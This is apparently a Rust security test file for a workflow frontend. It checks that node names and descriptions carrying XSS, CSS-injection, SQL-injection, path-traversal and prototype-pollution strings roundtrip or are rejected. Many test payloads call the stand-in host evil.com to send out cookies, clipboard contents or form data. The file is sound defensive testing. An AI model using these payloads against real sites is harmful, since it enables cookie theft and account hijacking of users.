//! BLACK-HAT adversarial tests for vo-frontend.
//!
//! Attack surfaces: Node.name/description (RSX text interpolation),
//! NodeId (user-controlled strings), generate_skeleton (YAML output),
//! CSS class injection, event handler abuse, HttpMethod::parse silent fallback.

use vo_frontend::ui::domain_types::{HttpMethod, NodeTemplateId};
use vo_frontend::ui::graph::{Node, NodeId, Workflow};
use vo_frontend::ui::prototype_palette::{generate_skeleton, SketchNode};

/// Helper: roundtrip a node name through JSON and assert the payload survives.
fn assert_name_roundtrip(payload: &str) {
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload, "payload must roundtrip verbatim");
}

#[test]
fn xss_node_name_script_tag_survives_roundtrip() {
    let payload = r#"<script>alert('xss')</script>"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("<script>"),
        "XSS payload must survive serialization"
    );
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.name, payload, "XSS payload roundtrips verbatim");
}

#[test]
fn xss_node_name_img_onerror() {
    let payload = r#"<img src=x onerror="alert(1)">"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("onerror"),
        "onerror payload survives serialization"
    );
}

#[test]
fn xss_node_description_with_iframe() {
    let payload = r#"<iframe src="javascript:alert(document.cookie)"></iframe>"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("javascript:"),
        "iframe payload survives serialization"
    );
}

#[test]
fn xss_node_name_svg_onload() {
    let payload = r#"<svg onload="fetch('https://evil.com?c='+document.cookie)">"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onload"), "svg onload payload survives");
}

#[test]
fn css_injection_node_name_with_style() {
    let payload = r#""><style>body{background:url('https://evil.com/track?u=1')}</style>"#;
    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("background:url"),
        "CSS exfil payload survives"
    );
}

#[test]
fn css_injection_node_icon_field() {
    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
    node.icon = r#"expression(alert(1))"#.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(
        json.contains("expression("),
        "CSS expression payload in icon"
    );
}

#[test]
fn nodeid_rejects_empty_string() {
    assert_eq!(NodeId::parse(""), None, "empty NodeId must be rejected");
}

#[test]
fn nodeid_rejects_xss_payload() {
    let xss = "<script>alert(1)</script>";
    assert_eq!(
        NodeId::parse(xss),
        None,
        "XSS payload must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_sql_injection() {
    let sqli = "1' OR '1'='1";
    assert_eq!(
        NodeId::parse(sqli),
        None,
        "SQL injection must not be valid NodeId"
    );
}

#[test]
fn nodeid_rejects_path_traversal() {
    assert_eq!(NodeId::parse("../../etc/passwd"), None);
    assert_eq!(NodeId::parse("..\\windows\\system32"), None);
}

#[test]
fn yaml_skeleton_uses_enum_type_not_user_label() {
    // generate_skeleton uses node.node_type (enum Display), not user-controlled label
    let mut sketch = SketchNode::new(NodeTemplateId::Run);
    sketch.label = "legit\n  - type: evil-injected-step".to_string();
    let yaml = generate_skeleton(&[sketch]);
    assert!(
        !yaml.contains("evil-injected-step"),
        "skeleton must NOT embed user label — only enum type"
    );
    assert!(
        yaml.contains("run"),
        "skeleton must contain the enum type string"
    );
}

#[test]
fn http_method_parse_silent_fallback_to_post() {
    let evil = "PUT-DELETE-EVIL";
    assert_eq!(HttpMethod::from_str_ignore_case(evil), HttpMethod::Post);
    let evil2 = "CONNECT";
    assert_eq!(HttpMethod::from_str_ignore_case(evil2), HttpMethod::Post);
}

#[test]
fn workflow_deserialization_rejects_truncated_json() {
    let truncated = r#"{"nodes":[{"id":"01JMQ","#;
    let result: Result<Workflow, _> = serde_json::from_str(truncated);
    assert!(result.is_err(), "truncated JSON must fail deserialization");
}

#[test]
fn workflow_with_malicious_config_key() {
    let mut node = Node::new(NodeId::new(), "ok".to_string(), vo_types::NodeKind::Pure);
    let evil_config = serde_json::json!({
        "__proto__": {"admin": true},
        "constructor": {"prototype": {"polluted": true}}
    });
    node.apply_config_update(&evil_config);
    // Must not panic — prototype pollution keys are just string keys in serde_json
    assert!(node.config.as_object().is_some());
    assert_eq!(node.config.as_object().map(|m| m.len()), Some(2));
}

// ============================================================================
// bh-004: Event handler XSS — signal ordering corruption via node names
// ============================================================================

#[test]
fn xss_event_handler_onclick_in_node_name() {
    let payload = r#"<div onclick="alert('xss')">click me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onmouseover_in_node_name() {
    let payload = r#"<a onmouseover="fetch('//evil.com/?c='+document.cookie)">hover</a>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onfocus_in_node_name() {
    let payload = r#"<input onfocus="eval(atob('YWxlcnQoMSk='))" autofocus>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onblur_in_node_name() {
    let payload = r#"<input onblur="window.location='//evil.com'">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onchange_in_node_name() {
    let payload = r#"<select onchange="new Image().src='//evil.com/?'+this.value"><option>1</option></select>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onsubmit_in_node_name() {
    let payload = r#"<form onsubmit="fetch('//evil.com',{method:'POST',body:document.cookie})"><input type=submit>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeydown_in_node_name() {
    let payload = r#"<body onkeydown="if(event.key==='q')alert(1)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeyup_in_node_name() {
    let payload = r#"<input onkeyup="String.fromCharCode(event.keyCode)">type here"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onkeypress_in_node_name() {
    let payload = r#"<input onkeypress="document.title='pwned'">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondblclick_in_node_name() {
    let payload = r#"<div ondblclick="alert(document.domain)">double-click</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_oncontextmenu_in_node_name() {
    let payload = r#"<div oncontextmenu="event.preventDefault();alert('right-click')">right-click me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondrag_in_node_name() {
    let payload = r#"<div ondrag="alert('dragged')">drag me</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ondrop_in_node_name() {
    let payload = r#"<div ondrop="fetch('//evil.com/?dropped='+event.dataTransfer.getData('text'))">drop zone</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onpaste_in_node_name() {
    let payload = r#"<input onpaste="navigator.clipboard.readText().then(t=>fetch('//evil.com/?p='+t))">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_oncopy_in_node_name() {
    let payload = r#"<div oncopy="alert('copied!')">copy this</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onscroll_in_node_name() {
    let payload = r#"<div onscroll="fetch('//evil.com/?scroll=1')" style="height:9999px">scroll</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onresize_in_node_name() {
    let payload = r#"<body onresize="fetch('//evil.com/?w='+innerWidth)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onanimationend_in_node_name() {
    let payload = r#"<div style="animation:x 0.1s" onanimationend="alert('anim')">animated</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_ontransitionend_in_node_name() {
    let payload = r#"<div style="transition:all 0.1s" ontransitionend="eval('alert(1)')">transition</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_onerror_in_node_description() {
    let payload = r#"<img src=x onerror="alert(document.cookie)">"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onerror"), "onerror in description must survive");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.description, payload, "description roundtrip verbatim");
}

#[test]
fn xss_event_handler_onload_in_node_description() {
    let payload = r#"<svg onload="fetch('//evil.com/'+document.cookie)">"#;
    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
    node.description = payload.to_string();
    let json = serde_json::to_string(&node).expect("serialize");
    assert!(json.contains("onload"), "onload in description must survive");
    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
    assert_eq!(recovered.description, payload);
}

#[test]
fn xss_event_handler_mixed_vector_in_node_name() {
    let payload = r#"<img src=x onerror="alert(1)"><svg onload="fetch('//evil')"><div onclick="eval(location)"></div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_encoded_entity_in_node_name() {
    let payload = r#"<img src=x on&#101;rror="alert(1)">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_null_byte_in_node_name() {
    let payload = "<img src=x onerror=\x00\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_newline_in_node_name() {
    let payload = "<img src=x\nonerror=\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_tab_in_node_name() {
    let payload = "<img src=x\tonerror=\"alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_backtick_template_in_node_name() {
    let payload = r#"<img src=x onerror="`${document.cookie}`">"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_unicode_in_node_name() {
    let payload = "<img src=x onerror=\"\u{0000}alert(1)\">";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_nested_quotes_in_node_name() {
    let payload = r#"<div onclick="alert(&quot;xss&quot;)">nested quotes</div>"#;
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_single_quote_attr_in_node_name() {
    let payload = "<div onclick='alert(1)'>single quote handler</div>";
    assert_name_roundtrip(payload);
}

#[test]
fn xss_event_handler_no_quotes_attr_in_node_name() {
    let payload = "<img src=x onerror=alert(1)>";
    assert_name_roundtrip(payload);
}
